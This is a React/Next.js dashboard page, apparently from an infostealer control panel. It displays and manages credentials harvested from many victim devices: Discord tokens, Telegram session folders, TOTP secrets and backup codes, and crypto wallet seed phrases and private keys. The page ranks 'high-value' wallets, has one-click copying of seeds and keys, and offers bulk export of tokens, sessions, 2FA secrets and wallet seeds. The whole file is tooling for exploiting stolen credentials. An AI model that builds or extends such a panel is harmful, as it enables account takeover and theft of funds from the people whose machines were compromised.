"use client"

import { useState, useEffect } from "react"
import { Card, CardContent, CardDescription, CardHeader, CardTitle } from "@/components/ui/card"
import { Badge } from "@/components/ui/badge"
import { Button } from "@/components/ui/button"
import { SidebarTrigger } from "@/components/ui/sidebar"
import { ScrollArea } from "@/components/ui/scroll-area"
import { Tabs, TabsContent, TabsList, TabsTrigger } from "@/components/ui/tabs"
import {
  Table,
  TableBody,
  TableCell,
  TableHead,
  TableHeader,
  TableRow,
} from "@/components/ui/table"
import {
  MessageCircle,
  Send,
  Shield,
  Wallet,
  TrendingUp,
  Download,
  Copy,
  Eye,
  EyeOff,
  CheckCircle,
  XCircle,
  AlertCircle,
  Coins,
} from "lucide-react"
import { AuthGuard } from "@/components/auth-guard"
import { toast } from "sonner"

interface GlobalStats {
  total_items: number
  total_devices: number
  devices_with_messaging_wallet_data: number
  counts: {
    discord_tokens: number
    telegram_sessions: number
    authenticator_data: number
    crypto_wallets: number
    high_value_wallets: number
  }
  breakdown: {
    discord_by_type: Record<string, number>
    telegram_by_type: Record<string, number>
    wallets_by_type: Record<string, number>
    wallets_by_blockchain: Record<string, number>
  }
}

interface DiscordToken {
  token: string
  token_type: string
  user_id?: string
  email?: string
  phone?: string
  source_application?: string
}

interface TelegramSession {
  tdata_path: string
  session_type: string
  has_key_data: boolean
  has_user_data: boolean
  phone_number?: string
  username?: string
  file_count: number
  total_size: number
}

interface AuthData {
  app_type: string
  service_name?: string
  account_name?: string
  secret_key?: string
  backup_codes?: string[]
}

interface CryptoWallet {
  wallet_type: string
  wallet_name: string
  blockchain?: string
  address?: string
  private_key?: string
  seed_phrase?: string
}

export default function MessagingWalletsPage() {
  return (
    <AuthGuard>
      <MessagingWalletsContent />
    </AuthGuard>
  )
}

function MessagingWalletsContent() {
  const [globalStats, setGlobalStats] = useState<GlobalStats | null>(null)
  const [highValueWallets, setHighValueWallets] = useState<CryptoWallet[]>([])
  const [isLoading, setIsLoading] = useState(true)
  const [showSecrets, setShowSecrets] = useState<Record<string, boolean>>({})

  useEffect(() => {
    fetchGlobalStats()
    fetchHighValueWallets()
  }, [])

  const fetchGlobalStats = async () => {
    try {
      const response = await fetch("/api/v1/messaging/stats/global")
      if (response.ok) {
        const data = await response.json()
        setGlobalStats(data)
      }
    } catch (error) {
      console.error("Error fetching global stats:", error)
      toast.error("Failed to load statistics")
    } finally {
      setIsLoading(false)
    }
  }

  const fetchHighValueWallets = async () => {
    try {
      const response = await fetch("/api/v1/wallets/high-value")
      if (response.ok) {
        const data = await response.json()
        setHighValueWallets(data.wallets || [])
      }
    } catch (error) {
      console.error("Error fetching high-value wallets:", error)
    }
  }

  const copyToClipboard = (text: string, label: string) => {
    navigator.clipboard.writeText(text)
    toast.success(`${label} copied to clipboard`)
  }

  const toggleSecret = (id: string) => {
    setShowSecrets((prev) => ({ ...prev, [id]: !prev[id] }))
  }

  const maskSecret = (secret: string) => {
    return "*".repeat(secret.length)
  }

  if (isLoading || !globalStats) {
    return (
      <div className="flex items-center justify-center h-screen">
        <div className="text-center">
          <div className="animate-spin rounded-full h-12 w-12 border-b-2 border-primary mx-auto"></div>
          <p className="mt-4 text-muted-foreground">Loading messaging & wallet data...</p>
        </div>
      </div>
    )
  }

  return (
    <div className="flex flex-col h-screen">
      {/* Header */}
      <header className="border-b bg-background/95 backdrop-blur supports-[backdrop-filter]:bg-background/60 sticky top-0 z-10">
        <div className="container flex h-16 items-center px-4">
          <SidebarTrigger className="mr-4" />
          <div className="flex items-center gap-3">
            <MessageCircle className="h-6 w-6 text-primary" />
            <div>
              <h1 className="text-2xl font-bold">Messaging & Wallets</h1>
              <p className="text-sm text-muted-foreground">
                {globalStats.total_items.toLocaleString()} items across{" "}
                {globalStats.devices_with_messaging_wallet_data} devices
              </p>
            </div>
          </div>
        </div>
      </header>

      <ScrollArea className="flex-1">
        <div className="container py-6 space-y-6">
          {/* Statistics Cards */}
          <div className="grid gap-4 md:grid-cols-2 lg:grid-cols-4">
            <Card>
              <CardHeader className="flex flex-row items-center justify-between space-y-0 pb-2">
                <CardTitle className="text-sm font-medium">Discord Tokens</CardTitle>
                <MessageCircle className="h-4 w-4 text-blue-500" />
              </CardHeader>
              <CardContent>
                <div className="text-2xl font-bold">{globalStats.counts.discord_tokens}</div>
                <p className="text-xs text-muted-foreground mt-1">
                  {Object.entries(globalStats.breakdown.discord_by_type).length} types detected
                </p>
              </CardContent>
            </Card>

            <Card>
              <CardHeader className="flex flex-row items-center justify-between space-y-0 pb-2">
                <CardTitle className="text-sm font-medium">Telegram Sessions</CardTitle>
                <Send className="h-4 w-4 text-sky-500" />
              </CardHeader>
              <CardContent>
                <div className="text-2xl font-bold">{globalStats.counts.telegram_sessions}</div>
                <p className="text-xs text-muted-foreground mt-1">
                  {Object.entries(globalStats.breakdown.telegram_by_type).length} session types
                </p>
              </CardContent>
            </Card>

            <Card>
              <CardHeader className="flex flex-row items-center justify-between space-y-0 pb-2">
                <CardTitle className="text-sm font-medium">2FA/Authenticator</CardTitle>
                <Shield className="h-4 w-4 text-green-500" />
              </CardHeader>
              <CardContent>
                <div className="text-2xl font-bold">{globalStats.counts.authenticator_data}</div>
                <p className="text-xs text-muted-foreground mt-1">TOTP secrets & backup codes</p>
              </CardContent>
            </Card>

            <Card>
              <CardHeader className="flex flex-row items-center justify-between space-y-0 pb-2">
                <CardTitle className="text-sm font-medium">Crypto Wallets</CardTitle>
                <Wallet className="h-4 w-4 text-yellow-500" />
              </CardHeader>
              <CardContent>
                <div className="text-2xl font-bold">{globalStats.counts.crypto_wallets}</div>
                <p className="text-xs text-muted-foreground mt-1">
                  {globalStats.counts.high_value_wallets} with seeds/keys
                </p>
              </CardContent>
            </Card>
          </div>

          {/* Breakdown Charts */}
          <div className="grid gap-4 md:grid-cols-2">
            <Card>
              <CardHeader>
                <CardTitle>Wallet Distribution</CardTitle>
                <CardDescription>By wallet type</CardDescription>
              </CardHeader>
              <CardContent>
                <div className="space-y-3">
                  {Object.entries(globalStats.breakdown.wallets_by_type).map(([type, count]) => (
                    <div key={type} className="flex items-center justify-between">
                      <div className="flex items-center gap-2">
                        <div className="w-2 h-2 rounded-full bg-yellow-500" />
                        <span className="text-sm capitalize">{type.replace(/_/g, " ")}</span>
                      </div>
                      <Badge variant="secondary">{count}</Badge>
                    </div>
                  ))}
                </div>
              </CardContent>
            </Card>

            <Card>
              <CardHeader>
                <CardTitle>Blockchain Distribution</CardTitle>
                <CardDescription>By cryptocurrency</CardDescription>
              </CardHeader>
              <CardContent>
                <div className="space-y-3">
                  {Object.entries(globalStats.breakdown.wallets_by_blockchain).map(
                    ([blockchain, count]) => (
                      <div key={blockchain} className="flex items-center justify-between">
                        <div className="flex items-center gap-2">
                          <Coins className="h-4 w-4 text-yellow-500" />
                          <span className="text-sm">{blockchain}</span>
                        </div>
                        <Badge variant="secondary">{count}</Badge>
                      </div>
                    ),
                  )}
                </div>
              </CardContent>
            </Card>
          </div>

          {/* High-Value Wallets */}
          {highValueWallets.length > 0 && (
            <Card>
              <CardHeader>
                <div className="flex items-center justify-between">
                  <div>
                    <CardTitle>High-Value Wallets</CardTitle>
                    <CardDescription>
                      Wallets with seed phrases or private keys ({highValueWallets.length} total)
                    </CardDescription>
                  </div>
                  <Button
                    variant="outline"
                    size="sm"
                    onClick={() =>
                      toast.success("Export functionality coming soon")
                    }
                  >
                    <Download className="h-4 w-4 mr-2" />
                    Export
                  </Button>
                </div>
              </CardHeader>
              <CardContent>
                <Table>
                  <TableHeader>
                    <TableRow>
                      <TableHead>Wallet</TableHead>
                      <TableHead>Type</TableHead>
                      <TableHead>Blockchain</TableHead>
                      <TableHead>Has Seed</TableHead>
                      <TableHead>Has Key</TableHead>
                      <TableHead>Actions</TableHead>
                    </TableRow>
                  </TableHeader>
                  <TableBody>
                    {highValueWallets.slice(0, 10).map((wallet, idx) => (
                      <TableRow key={idx}>
                        <TableCell className="font-medium">{wallet.wallet_name}</TableCell>
                        <TableCell>
                          <Badge variant="outline">{wallet.wallet_type}</Badge>
                        </TableCell>
                        <TableCell>{wallet.blockchain || "Unknown"}</TableCell>
                        <TableCell>
                          {wallet.seed_phrase ? (
                            <CheckCircle className="h-4 w-4 text-green-500" />
                          ) : (
                            <XCircle className="h-4 w-4 text-gray-300" />
                          )}
                        </TableCell>
                        <TableCell>
                          {wallet.private_key ? (
                            <CheckCircle className="h-4 w-4 text-green-500" />
                          ) : (
                            <XCircle className="h-4 w-4 text-gray-300" />
                          )}
                        </TableCell>
                        <TableCell>
                          <Button
                            variant="ghost"
                            size="sm"
                            onClick={() => {
                              const data = wallet.seed_phrase || wallet.private_key || ""
                              copyToClipboard(data, "Wallet data")
                            }}
                          >
                            <Copy className="h-4 w-4" />
                          </Button>
                        </TableCell>
                      </TableRow>
                    ))}
                  </TableBody>
                </Table>
                {highValueWallets.length > 10 && (
                  <div className="mt-4 text-center">
                    <Button variant="outline" size="sm">
                      View All {highValueWallets.length} Wallets
                    </Button>
                  </div>
                )}
              </CardContent>
            </Card>
          )}

          {/* Discord & Telegram Breakdown */}
          <div className="grid gap-4 md:grid-cols-2">
            <Card>
              <CardHeader>
                <CardTitle>Discord Token Types</CardTitle>
              </CardHeader>
              <CardContent>
                <div className="space-y-3">
                  {Object.entries(globalStats.breakdown.discord_by_type).map(([type, count]) => (
                    <div key={type} className="flex items-center justify-between">
                      <div className="flex items-center gap-2">
                        <MessageCircle className="h-4 w-4 text-blue-500" />
                        <span className="text-sm capitalize">{type.replace(/_/g, " ")}</span>
                      </div>
                      <Badge>{count}</Badge>
                    </div>
                  ))}
                </div>
              </CardContent>
            </Card>

            <Card>
              <CardHeader>
                <CardTitle>Telegram Session Types</CardTitle>
              </CardHeader>
              <CardContent>
                <div className="space-y-3">
                  {Object.entries(globalStats.breakdown.telegram_by_type).map(([type, count]) => (
                    <div key={type} className="flex items-center justify-between">
                      <div className="flex items-center gap-2">
                        <Send className="h-4 w-4 text-sky-500" />
                        <span className="text-sm capitalize">{type}</span>
                      </div>
                      <Badge>{count}</Badge>
                    </div>
                  ))}
                </div>
              </CardContent>
            </Card>
          </div>

          {/* Quick Actions */}
          <Card>
            <CardHeader>
              <CardTitle>Quick Actions</CardTitle>
              <CardDescription>Export and manage your data</CardDescription>
            </CardHeader>
            <CardContent>
              <div className="flex flex-wrap gap-3">
                <Button variant="outline">
                  <Download className="h-4 w-4 mr-2" />
                  Export All Discord Tokens
                </Button>
                <Button variant="outline">
                  <Download className="h-4 w-4 mr-2" />
                  Export Telegram Sessions
                </Button>
                <Button variant="outline">
                  <Download className="h-4 w-4 mr-2" />
                  Export 2FA Secrets
                </Button>
                <Button variant="outline">
                  <Download className="h-4 w-4 mr-2" />
                  Export Wallet Seeds
                </Button>
              </div>
            </CardContent>
          </Card>
        </div>
      </ScrollArea>
    </div>
  )
}
